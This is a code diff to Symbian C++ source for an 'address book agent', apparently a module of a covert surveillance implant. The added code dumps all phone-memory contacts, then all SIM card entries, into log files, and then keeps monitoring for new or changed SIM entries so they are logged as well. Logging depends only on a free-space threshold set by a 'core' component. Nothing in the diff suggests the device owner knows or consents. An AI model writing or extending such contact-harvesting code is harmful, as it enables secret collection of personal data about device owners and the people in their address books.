@@ -132,7 +132,6 @@ void CAgentAddressbook::ConstructL(const TDesC8& params)
 	iPhone.Open(iTelServer, info.iName);
 	iBookStore.Open(iPhone, _L("S7"));
 	iPhoneStoreMonitor = CPhoneStoreMonitor::NewL(iBookStore,*this); 
-	//iPhoneStoreMonitor->Listen();
 	#endif
 	}
 
@@ -192,15 +191,18 @@ void CAgentAddressbook::StartAgentCmdL()
 	iContacts = CContactIdArray::NewL(iFilter->iIds);
 	
 	iContactIndex = 0;
-	
-	iPhoneStoreMonitor->Listen(); //TODO: move at the end of start dump when done with testing
+	#ifndef __SERIES60_3X__  //look for SIM contacts only in Symbian3
+	iSimEntries = 0;
+	iSimIndex = 0;
+	iSimDump = EFalse;
+	#endif	
 	
 	iLongTask->NextRound();
 	}
 
 void CAgentAddressbook::StopAgentCmdL()
 	{
-	iPhoneStoreMonitor->Cancel(); //TODO: see if it's fine here
+	iPhoneStoreMonitor->Cancel(); 
 	
 	__FLOG(_L("StopAgentCmdL()"));
 	delete iDbNotifier;
@@ -264,7 +266,7 @@ HBufC* CAgentAddressbook::ReadFieldAsTextL(const CContactItemField& itemField)
 		}
 	}
 
-//code inspiration: mm_pbutil.cpp, phone book record format is TLV (tag-length-value)
+//code inspiration from symbian sources: mm_pbutil.cpp, phone book record format is TLV (tag-length-value)
 #ifndef __SERIES60_3X__
 HBufC8* CAgentAddressbook::GetSimContactBufferL(const TDesC8& aRecordBuf)
 	{
@@ -456,6 +458,123 @@ HBufC8* CAgentAddressbook::GetContactBufferL(const CContactItem& item)
 	return result;
 	}
 
+#ifndef __SERIES60_3X__  //only Symbian3
+void CAgentAddressbook::DoOneRoundL()
+	{
+	// If the Agent has been stopped, don't proceed on the next round...
+	if (iStopLongTask)
+		return;
+	if(iSimDump)
+		{
+		// dumping contacts in sim
+		if(iSimIndex>iSimEntries)
+			{
+			//we finished dump
+			//TODO: finalize dump
+			//start realtime dumping
+			iPhoneStoreMonitor->Listen();
+			return;
+			}
+		TRequestStatus status;
+		HBufC8* entry = HBufC8::NewL(1024);
+		TPtr8 buf = entry->Des();
+		iBookStore.Read(status, iSimIndex, 1, buf);
+		User::WaitForRequest(status);
+		if (status.Int() == KErrNone)
+			{
+			RBuf8 buf(GetSimContactBufferL(*entry));
+			buf.CleanupClosePushL();
+			if (buf.Length() > 0)
+				{
+				TInt value;
+				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
+				if(value)
+					{
+					CLogFile* logFile = CLogFile::NewLC(iFs);
+					logFile->CreateLogL(LOGTYPE_ADDRESSBOOK);
+					logFile->AppendLogL(buf);
+					logFile->CloseLogL();
+					CleanupStack::PopAndDestroy(logFile);
+					}
+				}
+			CleanupStack::PopAndDestroy(&buf);
+			}
+		delete entry;
+		iSimIndex++;
+		iLongTask->NextRound();
+		}
+	else
+		{
+		// dumping contacts in memory
+		if (iContactIndex >= iContacts->Count())
+			{
+			if(iContactIndex != 0)  
+				{
+				// write markup, we have finished the initial dump
+				// and we write the date of the most recent changed/added item
+				RBuf8 buf(GetTTimeBufferL(iTimestamp));
+				buf.CleanupClosePushL();
+				if (buf.Length() > 0)
+					{
+					iMarkupFile->WriteMarkupL(Type(),buf);
+					}
+				CleanupStack::PopAndDestroy(&buf);
+				}
+			// start sim dumping
+			RMobilePhoneBookStore::TMobilePhoneBookInfoV1 storeInfo;
+			RMobilePhoneBookStore::TMobilePhoneBookInfoV1Pckg storeInfoPckg(storeInfo);
+							
+			TRequestStatus status;
+			iBookStore.GetInfo(status, storeInfoPckg);
+			User::WaitForRequest(status);
+			if ( status.Int() != KErrNone ) 
+				{
+				return;
+				}
+			if ( storeInfo.iUsedEntries < 1 )
+				{ //no records
+				return;
+				}
+			iSimDump = ETrue;
+			iSimEntries = storeInfo.iTotalEntries;
+			iSimIndex = 1;
+			iLongTask->NextRound();
+			return;
+			}
+		TContactItemId itemId = (*iContacts)[iContactIndex];
+
+		// Maybe the item has been removed in the meanwhile...
+		if (itemId != KNullContactId)
+			{
+			__FLOG_1(_L("Contact:%d"), iContactIndex);
+			CContactItem* item = iContDb->ReadContactLC(itemId);
+			RBuf8 buf(GetContactBufferL(*item));
+			buf.CleanupClosePushL();
+			if (buf.Length() > 0)
+				{
+				TInt value;
+				RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold,value );
+				if(value)
+					{
+					// dump the buffer to the file log. 
+					AppendLogL(buf);
+					// check the date against the last saved one and update if necessary
+					TTime time = item->LastModified();
+					if (iTimestamp < time)
+						{
+						iTimestamp = time;
+						} 
+					}
+				}
+			CleanupStack::PopAndDestroy(&buf);
+			CleanupStack::PopAndDestroy(item);
+			}
+		iContactIndex++;
+
+		iLongTask->NextRound();
+		}
+	}
+#else  //non Symbian3 devices (5th and 3rd)
 void CAgentAddressbook::DoOneRoundL()
 	{
 	// If the Agent has been stopped, don't proceed on the next round...
@@ -463,19 +582,18 @@ void CAgentAddressbook::DoOneRoundL()
 		return;
 	if (iContactIndex >= iContacts->Count())
 		{
-			if(iContactIndex == 0)
-				return;
-			// write markup, we have finished the initial dump
-			// and we write the date of the most recent changed/added item
-			RBuf8 buf(GetTTimeBufferL(iTimestamp));
-			buf.CleanupClosePushL();
-			if (buf.Length() > 0)
-				{
-				iMarkupFile->WriteMarkupL(Type(),buf);
-				}
-			CleanupStack::PopAndDestroy(&buf);
-				
+		if(iContactIndex == 0)  
 			return;
+		// write markup, we have finished the initial dump
+		// and we write the date of the most recent changed/added item
+		RBuf8 buf(GetTTimeBufferL(iTimestamp));
+		buf.CleanupClosePushL();
+		if (buf.Length() > 0)
+			{
+			iMarkupFile->WriteMarkupL(Type(),buf);
+			}
+		CleanupStack::PopAndDestroy(&buf);
+		return;  
 		}
 	TContactItemId itemId = (*iContacts)[iContactIndex];
 
@@ -509,6 +627,7 @@ void CAgentAddressbook::DoOneRoundL()
 
 	iLongTask->NextRound();
 	}
+#endif
 
 TInt CAgentAddressbook::GetTypeFromItemField(const CContactItemField& aField)
 	{
@@ -680,18 +799,9 @@ void CAgentAddressbook::PhoneStoreEventL(TUint32 aEvent, TInt aIndex)
 		{
 		case RMobilePhoneStore::KStoreEntryAdded:
 		case RMobilePhoneStore::KStoreEntryChanged:
-		//case RMobilePhoneStore::KStoreEntryDeleted:
+		//case RMobilePhoneStore::KStoreEntryDeleted:  //ignored
 			{
-			RMobilePhoneBookStore::TMobilePhoneBookInfoV1 storeInfo;
-			RMobilePhoneBookStore::TMobilePhoneBookInfoV1Pckg storeInfoPckg(storeInfo);
-				
 			TRequestStatus status;
-			iBookStore.GetInfo(status, storeInfoPckg);
-			User::WaitForRequest(status);
-			if ( status.Int() != KErrNone ) 
-				{
-				return;
-				}
 			HBufC8* entry = HBufC8::NewL(1024);
 			TPtr8 buf = entry->Des();
 			iBookStore.Read(status, aIndex, 1, buf);
